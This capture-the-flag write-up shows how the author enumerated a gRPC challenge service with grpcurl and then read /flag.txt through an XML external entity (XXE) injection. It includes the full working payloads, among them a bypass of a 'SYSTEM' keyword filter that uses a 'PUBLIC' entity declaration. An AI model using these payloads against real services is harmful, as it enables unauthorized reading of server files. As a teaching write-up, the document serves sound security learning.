# Grand Resort for Pwning Cats

## Description
```
Welcome to the Grand Resort for Pwning Cats. 
Are you ready to become the cutest pwner kitten at our establishment?

The flag is stored in /flag.txt

Site: http://grandresort.challs.open.ecsc2024.it
```

## Provided Files
```
- backend.zip
```

## Writeup

Looking through the provided files we can find `main.go` in the backend directory. <br/>
```go
package main

import (
	"os"
	"log"
	"net"

	"google.golang.org/grpc"
	"google.golang.org/grpc/reflection"

	pb "grand-resort/reception/service"
)

type receptionServer struct {
	pb.UnimplementedReceptionServer
}

// Endpoints' definition are in endpoints.go, which is not provided... eheheh not so easy now, uh?

func main() {
	flag := os.Getenv("FLAG")
	err := os.WriteFile("/flag.txt", []byte(flag), 0644)
	if err != nil {
		panic(err)
	}

	lis, err := net.Listen("tcp", "0.0.0.0:38010")
	if err != nil {
		log.Fatalf("failed to listen: %v", err)
	}

	grpcServer := grpc.NewServer()
	pb.RegisterReceptionServer(grpcServer, &receptionServer{})
	reflection.Register(grpcServer)
	grpcServer.Serve(lis)
}
```

We can simply connect to the backend service using a tool like `grpcurl`. <br/>
```sh
$ grpcurl -plaintext grandresort.challs.open.ecsc2024.it:38010 list

GrandResort.Reception
grpc.reflection.v1.ServerReflection
grpc.reflection.v1alpha.ServerReflection
```

Using the same approach we can check the single endpoints. <br/>
```sh
$ grpcurl -plaintext grandresort.challs.open.ecsc2024.it:38010 describe GrandResort.Reception

GrandResort.Reception is a service:
service Reception {
  rpc bookRoom ( .GrandResort.BookingInfo ) returns ( .GrandResort.BookingConfirm );
  rpc createRoom73950029 ( .GrandResort.RoomRequestModel ) returns ( .GrandResort.RoomCreationResponse );
  rpc createRoomRequestModelc21a7f50 ( .google.protobuf.Empty ) returns ( .GrandResort.RoomRequestModel );
  rpc listRooms ( .google.protobuf.Empty ) returns ( .GrandResort.RoomList );
}

$ grpcurl -plaintext grandresort.challs.open.ecsc2024.it:38010 describe grpc.reflection.v1.ServerReflection

grpc.reflection.v1.ServerReflection is a service:
service ServerReflection {
  rpc ServerReflectionInfo ( stream .grpc.reflection.v1.ServerReflectionRequest ) returns ( stream .grpc.reflection.v1.ServerReflectionResponse );
}

$ grpcurl -plaintext grandresort.challs.open.ecsc2024.it:38010 describe grpc.reflection.v1alpha.ServerReflection

grpc.reflection.v1alpha.ServerReflection is a service:
service ServerReflection {
  rpc ServerReflectionInfo ( stream .grpc.reflection.v1alpha.ServerReflectionRequest ) returns ( stream .grpc.reflection.v1alpha.ServerReflectionResponse );
}
```

Now we can check the single methods of the endpoints. <br/>
```sh
$ grpcurl -plaintext grandresort.challs.open.ecsc2024.it:38010 describe GrandResort.Reception.bookRoom
GrandResort.Reception.bookRoom is a method:
rpc bookRoom ( .GrandResort.BookingInfo ) returns ( .GrandResort.BookingConfirm );

$ grpcurl -plaintext grandresort.challs.open.ecsc2024.it:38010 describe GrandResort.Reception.createRoom73950029
GrandResort.Reception.createRoom73950029 is a method:
rpc createRoom73950029 ( .GrandResort.RoomRequestModel ) returns ( .GrandResort.RoomCreationResponse );

$ grpcurl -plaintext grandresort.challs.open.ecsc2024.it:38010 describe GrandResort.Reception.createRoomRequestModelc21a7f50
GrandResort.Reception.createRoomRequestModelc21a7f50 is a method:
rpc createRoomRequestModelc21a7f50 ( .google.protobuf.Empty ) returns ( .GrandResort.RoomRequestModel );

$ grpcurl -plaintext grandresort.challs.open.ecsc2024.it:38010 describe GrandResort.Reception.listRooms
GrandResort.Reception.listRooms is a method:
rpc listRooms ( .google.protobuf.Empty ) returns ( .GrandResort.RoomList );
```

We can also use the methods. <br/>
```sh
$ grpcurl -plaintext grandresort.challs.open.ecsc2024.it:38010 GrandResort.Reception/listRooms
{
  "rooms": [
    {
      "id": "0cWHPVtqYK1gq34IUieZAYxE",
      "Name": "The cheap one",
      "description": "Oh, you want to save money? look here! what a MEAWESOME room, please be careful about rats and bugs pls... they're really huge KEK.",
      "price": 1
    },
    {
      "id": "uiVYozzRgRXF0CyMkfdwCGrI",
      "Name": "The regular one",
      "description": "This is our standard room, good price for non-demanding guests, PURRFECT if you want to optimize value for money :)",
      "price": 50
    },
    {
      "id": "47aOlxCtCvBYKNrFdkwtHRsl",
      "Name": "The luxury one",
      "description": "MEAWOUUUUUUUU, you're interested in a very luxury experience! no problem, we have the room for you... if you have enough money ;)",
      "price": 150
    },
    {
      "id": "IQXygEah2dI37aOqeBEVYfQ1",
      "Name": "Royal room",
      "description": "MEAWTASTIC your majesty! we have the right room to drain your wallEHM... to meet your high luxury requirements :3",
      "price": 30000
    }
  ]
}
``` 

This endpoint is already used in the application and doesn't really seem interesting, but the `createRoom73950029` method could be interesting. <br/>
```sh
$ grpcurl -plaintext -d '{"RoomRequestModel": "5"}' grandresort.challs.open.ecsc2024.it:38010 GrandResort.Reception/createRoom73950029
{
  "RoomCreationResponse": "Error while parsing: failed to create parse input: failed to read document from memory: Entity: line 1: parser error : Start tag expected, '\u003c' not found"
}
```

The error essentially told me that the input had to be in `XML` format. <br/>
```sh
$ grpcurl -plaintext -d '{"RoomRequestModel": "<element>5</element>"}' grandresort.challs.open.ecsc2024.it:38010 GrandResort.Reception/createRoom73950029
{
  "RoomCreationResponse": "You requested the creation of "
}
```

Seeing the response with `of ` made me think that if we find the correct `XML` object we can probably get our input in the response which may allow us to leak `/flag.txt`. <br/>

To get more detailed information about the methods we can use `grpcurl` again. <br/>
```sh
$ grpcurl -plaintext grandresort.challs.open.ecsc2024.it:38010 describe GrandResort.RoomRequestModel
GrandResort.RoomRequestModel is a message:
message RoomRequestModel {
  string RoomRequestModel = 1;
}

$ grpcurl -plaintext grandresort.challs.open.ecsc2024.it:38010 describe GrandResort.RoomCreationResponse
GrandResort.RoomCreationResponse is a message:
message RoomCreationResponse {
  string RoomCreationResponse = 1;
}
```

After not being able to find a lead I turned to another method which revealed valuable `XML-syntax`. <br/>
```sh
$ grpcurl -plaintext -d '{}' grandresort.challs.open.ecsc2024.it:38010 GrandResort.Reception.createRoomRequestModelc21a7f50

{
  "RoomRequestModel": "\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003croom\u003e\n    \u003cname\u003eRoomName\u003c/name\u003e\n    \u003cprice\u003e$100.0\u003c/price\u003e\n    \u003cdescription\u003eRoomDescription\u003c/description\u003e\n    \u003csize\u003e30 m2\u003c/size\u003e\n\u003c/room\u003e"
}
```

Finding the correct syntax I tried to use it on the same method. <br/>
```xml
<room><name>Yeet</name><price>$100</price><description>Flag_Pls</description><size>m2</size></room>
```

As this didn't work out I tried the syntax on the other room-creation-method which actually worked. <br/>
```sh
`$ grpcurl -plaintext -d '{"RoomRequestModel": "<room><name>Tes1tng</name><price>$100.0</price><description>Just Testing</description><size>30 m2</size></room>"}' grandresort.challs.open.ecsc2024.it:38010 GrandResort.Reception.createRoom73950029

{
  "RoomCreationResponse": "You requested the creation of Tes1tng"
}
```

Seeing that I was able to pass something in the request which is also used in the response I thought about a possible `XXE` vulnerability. Reason for `XXE` being the use of `XML` and the return of object `<name></name>`. <br/>
Knowing this I tested a possible `XXE` exploit to read `/flag.txt`. <br/>
```sh
$ grpcurl -plaintext -d '{"RoomRequestModel": "<!DOCTYPE room [<!ENTITY xxe SYSTEM \"file:///flag.txt\">]><room><name>&xxe;</name><price>$100.0</price><description>RoomDescription</description><size>30 m2</size></room>"}' grandresort.challs.open.ecsc2024.it:38010 GrandResort.Reception.createRoom73950029

{
  "RoomCreationResponse": "Error: you can't use the S-word!"
}
```

Seeing that `SYSTEM` is not allowed I tried to encode it which didn't work so I searched for other options. <br/>
Coming accross this [article](https://www.appsecmonkey.com/blog/xxe) I found that `SYSTEM` can be exchanged with `PUBLIC` and some other minor change. <br/>
```sh
$ grpcurl -plaintext -d '{"RoomRequestModel": "<!DOCTYPE room [<!ENTITY xxe PUBLIC \"\" \"/flag.txt\">]><room><name>&xxe;</name><price>$100.0</price><description>RoomDescription</description><size>30 m2</size></room>"}' grandresort.challs.open.ecsc2024.it:38010 GrandResort.Reception.createRoom73950029

{
  "RoomCreationResponse": "You requested the creation of openECSC{UWu_r3fl3ktIng_K17T3n5_uWU_24218e56}"
}
```

Executing `XXE` successfully and obtaining the flag concludes this writeup. 